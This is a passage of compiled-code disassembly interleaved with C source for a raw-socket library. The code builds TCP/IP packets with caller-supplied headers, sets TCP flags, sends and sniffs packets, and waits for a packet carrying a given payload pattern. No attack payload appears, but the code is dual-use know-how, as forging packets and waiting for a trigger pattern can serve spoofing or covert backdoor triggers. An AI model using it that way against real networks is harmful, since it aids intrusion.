  401daf:	e8 0c f4 ff ff       	call   4011c0 <memcpy@plt>
        free(ipheader);
  401db4:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  401db8:	48 89 c7             	mov    %rax,%rdi
  401dbb:	e8 80 f2 ff ff       	call   401040 <free@plt>
        ipheader = (struct iphdr*) packet;
  401dc0:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  401dc4:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
        //We incorporate the payload, goes after the tcpheader but we need it already for the checksum computation (the tcpheader does not take part)
        memcpy(packet+sizeof(struct iphdr)+sizeof(struct tcphdr), payload, payload_length);
  401dc8:	8b 45 a4             	mov    -0x5c(%rbp),%eax
  401dcb:	48 98                	cltq   
  401dcd:	48 8b 55 b0          	mov    -0x50(%rbp),%rdx
  401dd1:	48 8d 4a 28          	lea    0x28(%rdx),%rcx
  401dd5:	48 89 c2             	mov    %rax,%rdx
  401dd8:	48 8b 75 10          	mov    0x10(%rbp),%rsi
  401ddc:	48 89 cf             	mov    %rcx,%rdi
  401ddf:	e8 dc f3 ff ff       	call   4011c0 <memcpy@plt>
        //free(payload);
        payload = packet+sizeof(struct iphdr)+sizeof(struct tcphdr);
  401de4:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  401de8:	48 83 c0 28          	add    $0x28,%rax
  401dec:	48 89 45 10          	mov    %rax,0x10(%rbp)
        compute_ip_checksum(ipheader, (unsigned short*) packet, ipheader->tot_len);
  401df0:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  401df4:	0f b7 40 02          	movzwl 0x2(%rax),%eax
  401df8:	0f b7 d0             	movzwl %ax,%edx
  401dfb:	48 8b 4d b0          	mov    -0x50(%rbp),%rcx
  401dff:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  401e03:	48 89 ce             	mov    %rcx,%rsi
  401e06:	48 89 c7             	mov    %rax,%rdi
  401e09:	e8 ba 0e 00 00       	call   402cc8 <compute_ip_checksum>
        //Now we incorporate the tcpheader
        memcpy(packet+sizeof(struct iphdr), tcpheader, sizeof(struct tcphdr));
  401e0e:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  401e12:	48 8d 48 14          	lea    0x14(%rax),%rcx
  401e16:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  401e1a:	ba 14 00 00 00       	mov    $0x14,%edx
  401e1f:	48 89 c6             	mov    %rax,%rsi
  401e22:	48 89 cf             	mov    %rcx,%rdi
  401e25:	e8 96 f3 ff ff       	call   4011c0 <memcpy@plt>
        free(tcpheader);
  401e2a:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  401e2e:	48 89 c7             	mov    %rax,%rdi
  401e31:	e8 0a f2 ff ff       	call   401040 <free@plt>
        tcpheader = (struct tcphdr*)(packet+sizeof(struct iphdr));
  401e36:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  401e3a:	48 83 c0 14          	add    $0x14,%rax
  401e3e:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
        
        //We build the returning data structure
        packet_t result;
        result.ipheader = ipheader;
  401e42:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  401e46:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
        result.tcpheader = tcpheader;
  401e4a:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  401e4e:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
        result.payload = payload;
  401e52:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401e56:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
        result.packet = packet;
  401e5a:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  401e5e:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
        result.payload_length = payload_length;
  401e62:	8b 45 a4             	mov    -0x5c(%rbp),%eax
  401e65:	89 45 d8             	mov    %eax,-0x28(%rbp)
        
        
        return result;
  401e68:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  401e6c:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
  401e70:	48 8b 5d c8          	mov    -0x38(%rbp),%rbx
  401e74:	48 89 08             	mov    %rcx,(%rax)
  401e77:	48 89 58 08          	mov    %rbx,0x8(%rax)
  401e7b:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
  401e7f:	48 8b 5d d8          	mov    -0x28(%rbp),%rbx
  401e83:	48 89 48 10          	mov    %rcx,0x10(%rax)
  401e87:	48 89 58 18          	mov    %rbx,0x18(%rax)
  401e8b:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
  401e8f:	48 89 50 20          	mov    %rdx,0x20(%rax)

}
  401e93:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  401e97:	48 8b 5d f8          	mov    -0x8(%rbp),%rbx
  401e9b:	c9                   	leave  
  401e9c:	c3                   	ret    

0000000000401e9d <set_TCP_flags>:


int set_TCP_flags(packet_t packet, int hex_flags){
  401e9d:	f3 0f 1e fa          	endbr64 
  401ea1:	55                   	push   %rbp
  401ea2:	48 89 e5             	mov    %rsp,%rbp
  401ea5:	48 83 ec 10          	sub    $0x10,%rsp
  401ea9:	89 7d fc             	mov    %edi,-0x4(%rbp)
    if(hex_flags>0x200){
  401eac:	81 7d fc 00 02 00 00 	cmpl   $0x200,-0x4(%rbp)
  401eb3:	7e 13                	jle    401ec8 <set_TCP_flags+0x2b>
        perror("Invalid flags set");
  401eb5:	48 8d 3d 35 13 00 00 	lea    0x1335(%rip),%rdi        # 4031f1 <_IO_stdin_used+0x1f1>
  401ebc:	e8 6f f3 ff ff       	call   401230 <perror@plt>
        return -1;
  401ec1:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  401ec6:	eb 32                	jmp    401efa <set_TCP_flags+0x5d>
    }
    set_segment_flags(packet.tcpheader, hex_flags);
  401ec8:	48 8b 45 18          	mov    0x18(%rbp),%rax
  401ecc:	8b 55 fc             	mov    -0x4(%rbp),%edx
  401ecf:	89 d6                	mov    %edx,%esi
  401ed1:	48 89 c7             	mov    %rax,%rdi
  401ed4:	e8 a7 0a 00 00       	call   402980 <set_segment_flags>
    reforge_TCP_checksum(packet);
  401ed9:	48 83 ec 08          	sub    $0x8,%rsp
  401edd:	ff 75 30             	push   0x30(%rbp)
  401ee0:	ff 75 28             	push   0x28(%rbp)
  401ee3:	ff 75 20             	push   0x20(%rbp)
  401ee6:	ff 75 18             	push   0x18(%rbp)
  401ee9:	ff 75 10             	push   0x10(%rbp)
  401eec:	e8 1a fd ff ff       	call   401c0b <reforge_TCP_checksum>
  401ef1:	48 83 c4 30          	add    $0x30,%rsp
    return 0;
  401ef5:	b8 00 00 00 00       	mov    $0x0,%eax
}
  401efa:	c9                   	leave  
  401efb:	c3                   	ret    

0000000000401efc <build_null_packet>:

packet_t build_null_packet(packet_t packet){
  401efc:	f3 0f 1e fa          	endbr64 
  401f00:	55                   	push   %rbp
  401f01:	48 89 e5             	mov    %rsp,%rbp
  401f04:	53                   	push   %rbx
  401f05:	48 89 7d f0          	mov    %rdi,-0x10(%rbp)
    packet.ipheader = NULL;
  401f09:	48 c7 45 10 00 00 00 	movq   $0x0,0x10(%rbp)
  401f10:	00 
    packet.packet = NULL;
  401f11:	48 c7 45 30 00 00 00 	movq   $0x0,0x30(%rbp)
  401f18:	00 
    packet.payload = NULL;
  401f19:	48 c7 45 20 00 00 00 	movq   $0x0,0x20(%rbp)
  401f20:	00 
    packet.payload_length = 0;
  401f21:	c7 45 28 00 00 00 00 	movl   $0x0,0x28(%rbp)
    packet.tcpheader = NULL;
  401f28:	48 c7 45 18 00 00 00 	movq   $0x0,0x18(%rbp)
  401f2f:	00 
    return packet;
  401f30:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  401f34:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
  401f38:	48 8b 5d 18          	mov    0x18(%rbp),%rbx
  401f3c:	48 89 08             	mov    %rcx,(%rax)
  401f3f:	48 89 58 08          	mov    %rbx,0x8(%rax)
  401f43:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
  401f47:	48 8b 5d 28          	mov    0x28(%rbp),%rbx
  401f4b:	48 89 48 10          	mov    %rcx,0x10(%rax)
  401f4f:	48 89 58 18          	mov    %rbx,0x18(%rax)
  401f53:	48 8b 55 30          	mov    0x30(%rbp),%rdx
  401f57:	48 89 50 20          	mov    %rdx,0x20(%rax)
}
  401f5b:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  401f5f:	48 8b 5d f8          	mov    -0x8(%rbp),%rbx
  401f63:	c9                   	leave  
  401f64:	c3                   	ret    

0000000000401f65 <packet_destroy>:


int packet_destroy(packet_t packet){
  401f65:	f3 0f 1e fa          	endbr64 
  401f69:	55                   	push   %rbp
  401f6a:	48 89 e5             	mov    %rsp,%rbp
    free(packet.packet);
  401f6d:	48 8b 45 30          	mov    0x30(%rbp),%rax
  401f71:	48 89 c7             	mov    %rax,%rdi
  401f74:	e8 c7 f0 ff ff       	call   401040 <free@plt>
    packet.payload = NULL;
  401f79:	48 c7 45 20 00 00 00 	movq   $0x0,0x20(%rbp)
  401f80:	00 
    packet.packet = NULL;
  401f81:	48 c7 45 30 00 00 00 	movq   $0x0,0x30(%rbp)
  401f88:	00 
    return 0;
  401f89:	b8 00 00 00 00       	mov    $0x0,%eax
  401f8e:	5d                   	pop    %rbp
  401f8f:	c3                   	ret    

0000000000401f90 <rawsocket_send>:
#include "../include/socketManager.h"

int rawsocket_send(packet_t packet){
  401f90:	f3 0f 1e fa          	endbr64 
  401f94:	55                   	push   %rbp
  401f95:	48 89 e5             	mov    %rsp,%rbp
  401f98:	48 83 ec 30          	sub    $0x30,%rsp
  401f9c:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  401fa3:	00 00 
  401fa5:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  401fa9:	31 c0                	xor    %eax,%eax
    //Create raw socket.
    //This needs ROOT priviliges on the system!
    int sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
  401fab:	ba 06 00 00 00       	mov    $0x6,%edx
  401fb0:	be 03 00 00 00       	mov    $0x3,%esi
  401fb5:	bf 02 00 00 00       	mov    $0x2,%edi
  401fba:	e8 c1 f2 ff ff       	call   401280 <socket@plt>
  401fbf:	89 45 d8             	mov    %eax,-0x28(%rbp)
    if(sock == -1){
  401fc2:	83 7d d8 ff          	cmpl   $0xffffffff,-0x28(%rbp)
  401fc6:	75 16                	jne    401fde <rawsocket_send+0x4e>
        perror("ERROR opening raw socket. Do you have root priviliges?");
  401fc8:	48 8d 3d 39 12 00 00 	lea    0x1239(%rip),%rdi        # 403208 <_IO_stdin_used+0x208>
  401fcf:	e8 5c f2 ff ff       	call   401230 <perror@plt>
        return -1;
  401fd4:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  401fd9:	e9 d6 00 00 00       	jmp    4020b4 <rawsocket_send+0x124>
    }
    struct sockaddr_in sock_in;
    sock_in.sin_addr.s_addr = packet.ipheader->daddr;
  401fde:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401fe2:	8b 40 10             	mov    0x10(%rax),%eax
  401fe5:	89 45 e4             	mov    %eax,-0x1c(%rbp)
    sock_in.sin_family = AF_INET;
  401fe8:	66 c7 45 e0 02 00    	movw   $0x2,-0x20(%rbp)
    sock_in.sin_port = packet.tcpheader->dest;
  401fee:	48 8b 45 18          	mov    0x18(%rbp),%rax
  401ff2:	0f b7 40 02          	movzwl 0x2(%rax),%eax
  401ff6:	66 89 45 e2          	mov    %ax,-0x1e(%rbp)

    //We need to set the flag IP_HDRINCL as an option to specify that we already included all headers in the packet
    int one = 1;
  401ffa:	c7 45 d4 01 00 00 00 	movl   $0x1,-0x2c(%rbp)
    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one))<0){
  402001:	48 8d 55 d4          	lea    -0x2c(%rbp),%rdx
  402005:	8b 45 d8             	mov    -0x28(%rbp),%eax
  402008:	41 b8 04 00 00 00    	mov    $0x4,%r8d
  40200e:	48 89 d1             	mov    %rdx,%rcx
  402011:	ba 03 00 00 00       	mov    $0x3,%edx
  402016:	be 00 00 00 00       	mov    $0x0,%esi
  40201b:	89 c7                	mov    %eax,%edi
  40201d:	e8 5e f0 ff ff       	call   401080 <setsockopt@plt>
  402022:	85 c0                	test   %eax,%eax
  402024:	79 13                	jns    402039 <rawsocket_send+0xa9>
        perror("ERROR setting desired flags in socket options");
  402026:	48 8d 3d 13 12 00 00 	lea    0x1213(%rip),%rdi        # 403240 <_IO_stdin_used+0x240>
  40202d:	e8 fe f1 ff ff       	call   401230 <perror@plt>
        return -1;
  402032:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402037:	eb 7b                	jmp    4020b4 <rawsocket_send+0x124>
    }

    int sent = sendto(sock, packet.packet, packet.ipheader->tot_len, 0, (struct sockaddr*)&sock_in, sizeof(sock_in));
  402039:	48 8b 45 10          	mov    0x10(%rbp),%rax
  40203d:	0f b7 40 02          	movzwl 0x2(%rax),%eax
  402041:	0f b7 d0             	movzwl %ax,%edx
  402044:	48 8b 75 30          	mov    0x30(%rbp),%rsi
  402048:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
  40204c:	8b 45 d8             	mov    -0x28(%rbp),%eax
  40204f:	41 b9 10 00 00 00    	mov    $0x10,%r9d
  402055:	49 89 c8             	mov    %rcx,%r8
  402058:	b9 00 00 00 00       	mov    $0x0,%ecx
  40205d:	89 c7                	mov    %eax,%edi
  40205f:	e8 dc f0 ff ff       	call   401140 <sendto@plt>
  402064:	89 45 dc             	mov    %eax,-0x24(%rbp)
    if(sent<0){
  402067:	83 7d dc 00          	cmpl   $0x0,-0x24(%rbp)
  40206b:	79 13                	jns    402080 <rawsocket_send+0xf0>
        perror("ERROR sending the packet in the socket");
  40206d:	48 8d 3d fc 11 00 00 	lea    0x11fc(%rip),%rdi        # 403270 <_IO_stdin_used+0x270>
  402074:	e8 b7 f1 ff ff       	call   401230 <perror@plt>
        return -1;
  402079:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40207e:	eb 34                	jmp    4020b4 <rawsocket_send+0x124>
    }

    printf("Packet of length %d sent to %u\n", packet.ipheader->tot_len, packet.ipheader->daddr);
  402080:	48 8b 45 10          	mov    0x10(%rbp),%rax
  402084:	8b 50 10             	mov    0x10(%rax),%edx
  402087:	48 8b 45 10          	mov    0x10(%rbp),%rax
  40208b:	0f b7 40 02          	movzwl 0x2(%rax),%eax
  40208f:	0f b7 c0             	movzwl %ax,%eax
  402092:	89 c6                	mov    %eax,%esi
  402094:	48 8d 3d fd 11 00 00 	lea    0x11fd(%rip),%rdi        # 403298 <_IO_stdin_used+0x298>
  40209b:	b8 00 00 00 00       	mov    $0x0,%eax
  4020a0:	e8 4b f0 ff ff       	call   4010f0 <printf@plt>

    close(sock);
  4020a5:	8b 45 d8             	mov    -0x28(%rbp),%eax
  4020a8:	89 c7                	mov    %eax,%edi
  4020aa:	e8 a1 f0 ff ff       	call   401150 <close@plt>
    return 0;
  4020af:	b8 00 00 00 00       	mov    $0x0,%eax
}
  4020b4:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
  4020b8:	64 48 2b 0c 25 28 00 	sub    %fs:0x28,%rcx
  4020bf:	00 00 
  4020c1:	74 05                	je     4020c8 <rawsocket_send+0x138>
  4020c3:	e8 f8 ef ff ff       	call   4010c0 <__stack_chk_fail@plt>
  4020c8:	c9                   	leave  
  4020c9:	c3                   	ret    

00000000004020ca <rawsocket_sniff>:


packet_t rawsocket_sniff(){
  4020ca:	f3 0f 1e fa          	endbr64 
  4020ce:	55                   	push   %rbp
  4020cf:	48 89 e5             	mov    %rsp,%rbp
  4020d2:	53                   	push   %rbx
  4020d3:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
  4020da:	48 89 7d 98          	mov    %rdi,-0x68(%rbp)
  4020de:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  4020e5:	00 00 
  4020e7:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  4020eb:	31 c0                	xor    %eax,%eax
    //Create raw socket.
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
  4020ed:	ba 06 00 00 00       	mov    $0x6,%edx
  4020f2:	be 03 00 00 00       	mov    $0x3,%esi
  4020f7:	bf 02 00 00 00       	mov    $0x2,%edi
  4020fc:	e8 7f f1 ff ff       	call   401280 <socket@plt>
  402101:	89 45 ac             	mov    %eax,-0x54(%rbp)
    packet_t packet;

    if(sock == -1){
  402104:	83 7d ac ff          	cmpl   $0xffffffff,-0x54(%rbp)
  402108:	75 5f                	jne    402169 <rawsocket_sniff+0x9f>
        perror("ERROR opening raw socket. Do you have root priviliges?");
  40210a:	48 8d 3d f7 10 00 00 	lea    0x10f7(%rip),%rdi        # 403208 <_IO_stdin_used+0x208>
  402111:	e8 1a f1 ff ff       	call   401230 <perror@plt>
        packet = build_null_packet(packet);
  402116:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
  40211a:	48 83 ec 08          	sub    $0x8,%rsp
  40211e:	ff 75 e0             	push   -0x20(%rbp)
  402121:	ff 75 d8             	push   -0x28(%rbp)
  402124:	ff 75 d0             	push   -0x30(%rbp)
  402127:	ff 75 c8             	push   -0x38(%rbp)
  40212a:	ff 75 c0             	push   -0x40(%rbp)
  40212d:	48 89 c7             	mov    %rax,%rdi
  402130:	e8 c7 fd ff ff       	call   401efc <build_null_packet>
  402135:	48 83 c4 30          	add    $0x30,%rsp
        return packet;
  402139:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  40213d:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
  402141:	48 8b 5d c8          	mov    -0x38(%rbp),%rbx
  402145:	48 89 08             	mov    %rcx,(%rax)
  402148:	48 89 58 08          	mov    %rbx,0x8(%rax)
  40214c:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
  402150:	48 8b 5d d8          	mov    -0x28(%rbp),%rbx
  402154:	48 89 48 10          	mov    %rcx,0x10(%rax)
  402158:	48 89 58 18          	mov    %rbx,0x18(%rax)
  40215c:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
  402160:	48 89 50 20          	mov    %rdx,0x20(%rax)
  402164:	e9 67 01 00 00       	jmp    4022d0 <rawsocket_sniff+0x206>
    }

    //Result of recv
    int buffer_size = 20000;
  402169:	c7 45 b0 20 4e 00 00 	movl   $0x4e20,-0x50(%rbp)
    char* buffer = calloc(buffer_size, sizeof(char));
  402170:	8b 45 b0             	mov    -0x50(%rbp),%eax
  402173:	48 98                	cltq   
  402175:	be 01 00 00 00       	mov    $0x1,%esi
  40217a:	48 89 c7             	mov    %rax,%rdi
  40217d:	e8 fe ef ff ff       	call   401180 <calloc@plt>
  402182:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
    int received = recvfrom(sock, buffer, buffer_size, 0x0, NULL, NULL);
  402186:	8b 45 b0             	mov    -0x50(%rbp),%eax
  402189:	48 63 d0             	movslq %eax,%rdx
  40218c:	48 8b 75 b8          	mov    -0x48(%rbp),%rsi
  402190:	8b 45 ac             	mov    -0x54(%rbp),%eax
  402193:	41 b9 00 00 00 00    	mov    $0x0,%r9d
  402199:	41 b8 00 00 00 00    	mov    $0x0,%r8d
  40219f:	b9 00 00 00 00       	mov    $0x0,%ecx
  4021a4:	89 c7                	mov    %eax,%edi
  4021a6:	e8 55 f0 ff ff       	call   401200 <recvfrom@plt>
  4021ab:	89 45 b4             	mov    %eax,-0x4c(%rbp)

    

    if(received<0){
  4021ae:	83 7d b4 00          	cmpl   $0x0,-0x4c(%rbp)
  4021b2:	0f 89 96 00 00 00    	jns    40224e <rawsocket_sniff+0x184>
        perror("ERROR receiving packet in the socket");
  4021b8:	48 8d 3d f9 10 00 00 	lea    0x10f9(%rip),%rdi        # 4032b8 <_IO_stdin_used+0x2b8>
  4021bf:	e8 6c f0 ff ff       	call   401230 <perror@plt>
        packet = build_null_packet(packet);
  4021c4:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
  4021cb:	48 83 ec 08          	sub    $0x8,%rsp
  4021cf:	ff 75 e0             	push   -0x20(%rbp)
  4021d2:	ff 75 d8             	push   -0x28(%rbp)
  4021d5:	ff 75 d0             	push   -0x30(%rbp)
  4021d8:	ff 75 c8             	push   -0x38(%rbp)
  4021db:	ff 75 c0             	push   -0x40(%rbp)
  4021de:	48 89 c7             	mov    %rax,%rdi
  4021e1:	e8 16 fd ff ff       	call   401efc <build_null_packet>
  4021e6:	48 83 c4 30          	add    $0x30,%rsp
  4021ea:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4021f1:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  4021f8:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
  4021fc:	48 89 55 c8          	mov    %rdx,-0x38(%rbp)
  402200:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  402207:	48 8b 95 78 ff ff ff 	mov    -0x88(%rbp),%rdx
  40220e:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
  402212:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
  402216:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  40221a:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
        return packet;
  40221e:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  402222:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
  402226:	48 8b 5d c8          	mov    -0x38(%rbp),%rbx
  40222a:	48 89 08             	mov    %rcx,(%rax)
  40222d:	48 89 58 08          	mov    %rbx,0x8(%rax)
  402231:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
  402235:	48 8b 5d d8          	mov    -0x28(%rbp),%rbx
  402239:	48 89 48 10          	mov    %rcx,0x10(%rax)
  40223d:	48 89 58 18          	mov    %rbx,0x18(%rax)
  402241:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
  402245:	48 89 50 20          	mov    %rdx,0x20(%rax)
  402249:	e9 82 00 00 00       	jmp    4022d0 <rawsocket_sniff+0x206>
    }

    packet = parse_packet(buffer, buffer_size);
  40224e:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
  402255:	8b 55 b0             	mov    -0x50(%rbp),%edx
  402258:	48 8b 4d b8          	mov    -0x48(%rbp),%rcx
  40225c:	48 89 ce             	mov    %rcx,%rsi
  40225f:	48 89 c7             	mov    %rax,%rdi
  402262:	e8 36 03 00 00       	call   40259d <parse_packet>
  402267:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  40226e:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  402275:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
  402279:	48 89 55 c8          	mov    %rdx,-0x38(%rbp)
  40227d:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  402284:	48 8b 95 78 ff ff ff 	mov    -0x88(%rbp),%rdx
  40228b:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
  40228f:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
  402293:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  402297:	48 89 45 e0          	mov    %rax,-0x20(%rbp)

    close(sock);
  40229b:	8b 45 ac             	mov    -0x54(%rbp),%eax
  40229e:	89 c7                	mov    %eax,%edi
  4022a0:	e8 ab ee ff ff       	call   401150 <close@plt>
    return packet;
  4022a5:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  4022a9:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
  4022ad:	48 8b 5d c8          	mov    -0x38(%rbp),%rbx
  4022b1:	48 89 08             	mov    %rcx,(%rax)
  4022b4:	48 89 58 08          	mov    %rbx,0x8(%rax)
  4022b8:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
  4022bc:	48 8b 5d d8          	mov    -0x28(%rbp),%rbx
  4022c0:	48 89 48 10          	mov    %rcx,0x10(%rax)
  4022c4:	48 89 58 18          	mov    %rbx,0x18(%rax)
  4022c8:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
  4022cc:	48 89 50 20          	mov    %rdx,0x20(%rax)
}
  4022d0:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  4022d4:	64 48 2b 04 25 28 00 	sub    %fs:0x28,%rax
  4022db:	00 00 
  4022dd:	74 05                	je     4022e4 <rawsocket_sniff+0x21a>
  4022df:	e8 dc ed ff ff       	call   4010c0 <__stack_chk_fail@plt>
  4022e4:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  4022e8:	48 8b 5d f8          	mov    -0x8(%rbp),%rbx
  4022ec:	c9                   	leave  
  4022ed:	c3                   	ret    

00000000004022ee <rawsocket_sniff_pattern>:

packet_t rawsocket_sniff_pattern(char* payload_pattern){
  4022ee:	f3 0f 1e fa          	endbr64 
  4022f2:	55                   	push   %rbp
  4022f3:	48 89 e5             	mov    %rsp,%rbp
  4022f6:	53                   	push   %rbx
  4022f7:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
  4022fe:	48 89 7d 98          	mov    %rdi,-0x68(%rbp)
  402302:	48 89 75 90          	mov    %rsi,-0x70(%rbp)
  402306:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  40230d:	00 00 
  40230f:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  402313:	31 c0                	xor    %eax,%eax
    int pattern_received = 0;
  402315:	c7 45 a8 00 00 00 00 	movl   $0x0,-0x58(%rbp)
    //Create raw socket.
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
  40231c:	ba 06 00 00 00       	mov    $0x6,%edx
  402321:	be 03 00 00 00       	mov    $0x3,%esi
  402326:	bf 02 00 00 00       	mov    $0x2,%edi
  40232b:	e8 50 ef ff ff       	call   401280 <socket@plt>
  402330:	89 45 ac             	mov    %eax,-0x54(%rbp)
    packet_t packet;

    while(!pattern_received){
  402333:	e9 c4 01 00 00       	jmp    4024fc <rawsocket_sniff_pattern+0x20e>
        if(sock == -1){
  402338:	83 7d ac ff          	cmpl   $0xffffffff,-0x54(%rbp)
  40233c:	75 5f                	jne    40239d <rawsocket_sniff_pattern+0xaf>
            perror("ERROR opening raw socket. Do you have root priviliges?");
  40233e:	48 8d 3d c3 0e 00 00 	lea    0xec3(%rip),%rdi        # 403208 <_IO_stdin_used+0x208>
  402345:	e8 e6 ee ff ff       	call   401230 <perror@plt>
            packet = build_null_packet(packet);
  40234a:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
  40234e:	48 83 ec 08          	sub    $0x8,%rsp
  402352:	ff 75 e0             	push   -0x20(%rbp)
  402355:	ff 75 d8             	push   -0x28(%rbp)
  402358:	ff 75 d0             	push   -0x30(%rbp)
  40235b:	ff 75 c8             	push   -0x38(%rbp)
  40235e:	ff 75 c0             	push   -0x40(%rbp)
  402361:	48 89 c7             	mov    %rax,%rdi
  402364:	e8 93 fb ff ff       	call   401efc <build_null_packet>
  402369:	48 83 c4 30          	add    $0x30,%rsp
            return packet;
  40236d:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  402371:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
  402375:	48 8b 5d c8          	mov    -0x38(%rbp),%rbx
  402379:	48 89 08             	mov    %rcx,(%rax)
  40237c:	48 89 58 08          	mov    %rbx,0x8(%rax)
  402380:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
  402384:	48 8b 5d d8          	mov    -0x28(%rbp),%rbx
  402388:	48 89 48 10          	mov    %rcx,0x10(%rax)
  40238c:	48 89 58 18          	mov    %rbx,0x18(%rax)
  402390:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
  402394:	48 89 50 20          	mov    %rdx,0x20(%rax)
  402398:	e9 9e 01 00 00       	jmp    40253b <rawsocket_sniff_pattern+0x24d>
        }

        //Result of recv
        int buffer_size = 20000;
  40239d:	c7 45 b0 20 4e 00 00 	movl   $0x4e20,-0x50(%rbp)
        char* buffer = calloc(buffer_size, sizeof(char));
  4023a4:	8b 45 b0             	mov    -0x50(%rbp),%eax
  4023a7:	48 98                	cltq   
  4023a9:	be 01 00 00 00       	mov    $0x1,%esi
  4023ae:	48 89 c7             	mov    %rax,%rdi
  4023b1:	e8 ca ed ff ff       	call   401180 <calloc@plt>
  4023b6:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
        int received = recvfrom(sock, buffer, buffer_size, 0x0, NULL, NULL);
  4023ba:	8b 45 b0             	mov    -0x50(%rbp),%eax
  4023bd:	48 63 d0             	movslq %eax,%rdx
  4023c0:	48 8b 75 b8          	mov    -0x48(%rbp),%rsi
  4023c4:	8b 45 ac             	mov    -0x54(%rbp),%eax
  4023c7:	41 b9 00 00 00 00    	mov    $0x0,%r9d
  4023cd:	41 b8 00 00 00 00    	mov    $0x0,%r8d
  4023d3:	b9 00 00 00 00       	mov    $0x0,%ecx
  4023d8:	89 c7                	mov    %eax,%edi
  4023da:	e8 21 ee ff ff       	call   401200 <recvfrom@plt>
  4023df:	89 45 b4             	mov    %eax,-0x4c(%rbp)

        if(received<0){
  4023e2:	83 7d b4 00          	cmpl   $0x0,-0x4c(%rbp)
  4023e6:	0f 89 96 00 00 00    	jns    402482 <rawsocket_sniff_pattern+0x194>
            perror("ERROR receiving packet in the socket");
  4023ec:	48 8d 3d c5 0e 00 00 	lea    0xec5(%rip),%rdi        # 4032b8 <_IO_stdin_used+0x2b8>
  4023f3:	e8 38 ee ff ff       	call   401230 <perror@plt>
            packet = build_null_packet(packet);
  4023f8:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
  4023ff:	48 83 ec 08          	sub    $0x8,%rsp
  402403:	ff 75 e0             	push   -0x20(%rbp)
  402406:	ff 75 d8             	push   -0x28(%rbp)
